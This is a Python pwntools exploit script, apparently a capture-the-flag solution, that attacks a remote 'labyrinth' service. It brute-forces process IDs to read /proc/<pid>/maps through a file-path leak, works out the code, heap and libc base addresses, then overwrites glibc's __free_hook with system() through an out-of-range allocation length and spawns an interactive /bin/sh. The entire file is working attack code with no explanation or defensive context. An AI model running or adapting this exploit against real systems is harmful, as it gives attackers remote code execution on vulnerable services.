from pwn import *

import os
import re
import subprocess


def make_maze(width, height, info, maze_data):
    p.recvuntil('4. exit\n> ')
    p.sendline('1')
    p.recvuntil('NAME> ')
    p.sendline('Qwaz')
    p.recvuntil('EMAIL> ')
    p.sendline('Qwaz')
    p.recvuntil('WIDTH> ')
    p.sendline(str(width))
    p.recvuntil('HEIGHT> ')
    p.sendline(str(height))
    p.recvuntil('INFO> ')
    p.sendline(info)
    p.send(maze_data)
    p.recvuntil('SAVE_KEY is ')
    return p.recvline().strip()


def do_maze(maze_id):
    p.recvuntil('4. exit\n> ')
    p.sendline('2')
    p.recvuntil('KEY>')
    p.sendline(maze_id)


def show_info(maze_id):
    p.recvuntil('4. exit\n> ')
    p.sendline('3')
    p.recvuntil('KEY>')
    p.sendline(maze_id)

SYSTEM_OFFSET = 0x0003a940
FREE_HOOK_OFFSET = 0x001b18b0

p = remote('labyrinth.eatpwnnosleep.com', 10000)
g = log.progress('pid')
for pid in range(2100, 100000):
    show_info('/proc/{}/maps'.format(str(pid)))
    g.status(str(pid))
    data = p.recvn(6)
    if data != 'Nope:)':
        data += p.recvuntil('1. make_labyrinth', drop=True)
        if '/home/labyrinth/laby' in data:
            print '[+] pid: %d' % pid
            print data
            break
g.success('%d' % pid)

show_info('/proc/{}/maps'.format(str(pid)))
data = p.recvuntil('1. make_labyrinth', drop=True)

hex_re = '[0-9a-fA-F]+'
code_base = int(re.search(r'([0-9a-fA-F]+)-[0-9a-fA-F]+ r-xp[^\n]+/home/labyrinth/laby', data).group(1), 16)
heap_base = int(re.search(r'([0-9a-fA-F]+)-[0-9a-fA-F]+ rw-p[^\n]+\[heap\]', data).group(1), 16)
libc_base = int(re.search(r'([0-9a-fA-F]+)-[0-9a-fA-F]+ r-xp[^\n]+/lib32/libc-2.23.so', data).group(1), 16)

log.success('Code base: %08x' % code_base)
log.success('Heap base: %08x' % heap_base)
log.success('libc base: %08x' % libc_base)

easy_maze = make_maze(8, 1, 'X SE__----'+p32(0xdeadbeef)+p32(0xffffffff), '12345678')
do_maze(easy_maze)

print p.recvline()
p.sendline('D')

alloc_length = libc_base + FREE_HOOK_OFFSET - (heap_base + 0x11a0)
if alloc_length >= 2147483648:
    alloc_length -= 2147483648*2
log.success('alloc length: %d' % alloc_length)
p.sendlineafter('Mame length>', str(alloc_length-1))
p.sendlineafter('Comments Length>', '10000')
p.sendlineafter('comment> ', '/bin/sh\x00'+p32(libc_base + SYSTEM_OFFSET))

p.interactive()
